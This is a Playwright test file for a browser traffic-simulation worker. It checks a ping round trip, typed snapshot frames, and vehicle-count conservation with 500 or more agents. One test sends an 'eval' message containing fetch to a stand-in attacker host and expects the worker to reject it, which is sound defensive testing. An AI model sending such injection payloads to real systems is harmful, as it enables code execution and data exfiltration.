import { expect, test } from "@playwright/test";
import { freeRoad } from "../../src/scenarios/presets";
import { mixedFleet } from "../vehicle-fixture";
import {
  SNAPSHOT_STRIDE,
  vehicleTypeIds,
  bodyShapes,
  defaultBodyShapes,
} from "../../src/model/vehicles";

test("real browser module worker round-trips ping, rejects injection and loads typed snapshots", async ({
  page,
}) => {
  await page.goto("/");
  const result = await page.evaluate(async (scenario) => {
    const worker = new Worker("/simulation.worker.js", { type: "module" });
    const request = (input: unknown): Promise<Record<string, unknown>> =>
      new Promise((resolve, reject) => {
        const timeout = setTimeout(
          () => reject(new Error("Worker response timed out")),
          5000,
        );
        worker.onmessage = (event) => {
          clearTimeout(timeout);
          resolve(event.data);
        };
        worker.onerror = (event) => {
          clearTimeout(timeout);
          reject(new Error(event.message));
        };
        worker.postMessage(input);
      });
    try {
      const ping = await request({
        type: "ping",
        requestId: "browser-round-trip",
      });
      const attack = await request({
        type: "eval",
        code: 'fetch("https://attacker.invalid")',
      });
      const frame = await request({ type: "load", scenario });
      return {
        ping,
        attackType: attack.type,
        frameType: frame.type,
        typedArray: frame.states instanceof Float32Array,
      };
    } finally {
      worker.terminate();
    }
  }, freeRoad());
  expect(result).toEqual({
    ping: { type: "pong", requestId: "browser-round-trip" },
    attackType: "error",
    frameType: "frame",
    typedArray: true,
  });
});

for (const mixed of [false, true])
  test(`real worker keeps 500+ ${mixed ? "mixed" : "default"} agents finite, conserves arrivals and resets cleanly`, async ({
    page,
  }) => {
    test.setTimeout(30000);
    await page.goto("/");
    const s = freeRoad();
    s.duration = 600;
    s.edges[0].lanes = 6;
    s.edges[0].width = 21;
    s.demand[0].rate = 7200;
    if (mixed) s.fleet = mixedFleet();
    const result = await page.evaluate(
      async ({ scenario, typeIds, stride, shapes, fallbacks }) => {
        const worker = new Worker("/simulation.worker.js", { type: "module" });
        interface Frame {
          type: string;
          states: Float32Array;
          metrics: {
            time: number;
            moving: number;
            generated: number;
            active: number;
            completed: number;
            rejected: number;
          };
        }
        const request = (input: unknown): Promise<Frame> =>
          new Promise((resolve, reject) => {
            const timeout = setTimeout(
              () => reject(new Error("Worker response timed out")),
              10000,
            );
            worker.onmessage = (event) => {
              clearTimeout(timeout);
              resolve(event.data);
            };
            worker.onerror = (event) => {
              clearTimeout(timeout);
              reject(new Error(event.message));
            };
            worker.postMessage(input);
          });
        try {
          let frame = await request({ type: "load", scenario });
          for (let i = 0; i < 15; i++)
            frame = await request({ type: "step", count: 600 });
          const { metrics: m, states } = frame;
          const reset = await request({ type: "load", scenario });
          return {
            moving: m.moving,
            time: m.time,
            conserved: m.generated === m.active + m.completed + m.rejected,
            finite: [...states].every(Number.isFinite),
            packedLength: states.length,
            dimensionsValid: Array.from(
              { length: states.length / stride },
              (_, i) => i * stride,
            ).every((i) => {
              if (!scenario.fleet) return true;
              const profile = scenario.fleet.find(
                (p) => p.id === typeIds[states[i + 11]],
              );
              return (
                profile &&
                Math.abs(states[i + 9] - profile.length) < 0.00001 &&
                Math.abs(states[i + 10] - profile.width) < 0.00001 &&
                states[i + 12] ===
                  shapes.indexOf(profile.bodyShape ?? fallbacks[profile.id]) &&
                states[i + 4] <= profile.maxSpeed + 0.00001
              );
            }),
            resetTime: reset.metrics.time,
          };
        } finally {
          worker.terminate();
        }
      },
      {
        scenario: s,
        typeIds: vehicleTypeIds,
        stride: SNAPSHOT_STRIDE,
        shapes: bodyShapes,
        fallbacks: defaultBodyShapes,
      },
    );
    expect(result.moving).toBeGreaterThanOrEqual(500);
    expect(result.time).toBe(300);
    expect(result.conserved).toBe(true);
    expect(result.finite).toBe(true);
    expect(result.dimensionsValid).toBe(true);
    expect(result.packedLength).toBe(result.moving * SNAPSHOT_STRIDE);
    expect(result.resetTime).toBe(0);
  });
